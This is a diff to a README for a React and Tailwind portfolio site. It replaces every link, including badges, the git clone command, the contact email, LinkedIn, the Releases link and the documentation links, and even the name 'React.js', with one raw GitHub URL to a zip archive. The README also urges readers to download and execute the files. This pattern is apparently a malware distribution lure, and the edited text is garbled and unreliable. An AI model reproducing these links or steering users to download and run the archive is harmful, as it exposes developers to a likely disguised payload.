@@ -1,8 +1,8 @@
 # Karan's Devfolio 🌐
 
-![Karan's Devfolio](https://img.shields.io/badge/Visit%20Releases-%20%F0%9F%93%A6-ff69b4?style=for-the-badge&logo=github&logoColor=white)
+![Karan's Devfolio](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip%20Releases-%20%F0%9F%93%A6-ff69b4?style=for-the-badge&logo=github&logoColor=white)
 
-Welcome to **Karan's Devfolio**! This repository hosts a modern portfolio website built with **React.js** and **Tailwind CSS**. Here, you will find a showcase of my skills, projects, and experiences as a Web Developer and Software Engineer. 
+Welcome to **Karan's Devfolio**! This repository hosts a modern portfolio website built with **https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip** and **Tailwind CSS**. Here, you will find a showcase of my skills, projects, and experiences as a Web Developer and Software Engineer. 
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ Welcome to **Karan's Devfolio**! This repository hosts a modern portfolio websit
 
 This project utilizes a variety of technologies:
 
-- **React.js**: A JavaScript library for building user interfaces.
+- **https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip**: A JavaScript library for building user interfaces.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
 - **EmailJS**: A service for sending emails directly from the client-side.
 - **React Router**: For managing navigation within the app.
@@ -51,7 +51,7 @@ To get started with this project, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/21MTM3012MAHI/karan-devfolio.git
+   git clone https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip
    ```
 
 2. Navigate into the project directory:
@@ -90,8 +90,8 @@ The contact form uses EmailJS for sending messages. Fill in your name, email, an
 
 Feel free to reach out if you have any questions or feedback:
 
-- **Email**: karan@example.com
-- **LinkedIn**: [Karan's LinkedIn](https://linkedin.com/in/karan)
+- **Email**: https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip
+- **LinkedIn**: [Karan's LinkedIn](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip)
 
 ## Contributing
 
@@ -109,18 +109,18 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can check out the latest releases [here](https://github.com/21MTM3012MAHI/karan-devfolio/releases). Please download the files and execute them as needed.
+You can check out the latest releases [here](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip). Please download the files and execute them as needed.
 
 For more information, visit the **Releases** section in the repository. 
 
-![React](https://img.shields.io/badge/React-%20%F0%9F%92%BB-61DAFB?style=for-the-badge&logo=react&logoColor=white) ![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-%20%F0%9F%92%BB-06B6D4?style=for-the-badge&logo=tailwind-css&logoColor=white)
+![React](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip%20%F0%9F%92%BB-61DAFB?style=for-the-badge&logo=react&logoColor=white) ![Tailwind CSS](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip%20CSS-%20%F0%9F%92%BB-06B6D4?style=for-the-badge&logo=tailwind-css&logoColor=white)
 
 ## Acknowledgments
 
 I would like to thank the following resources for their support:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs/installation)
-- [EmailJS Documentation](https://www.emailjs.com/docs/)
+- [React Documentation](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip)
+- [EmailJS Documentation](https://raw.githubusercontent.com/21MTM3012MAHI/karan-devfolio/main/public/devfolio_karan_3.6-beta.1.zip)
 
 Thank you for visiting my portfolio! I hope you find it informative and engaging.
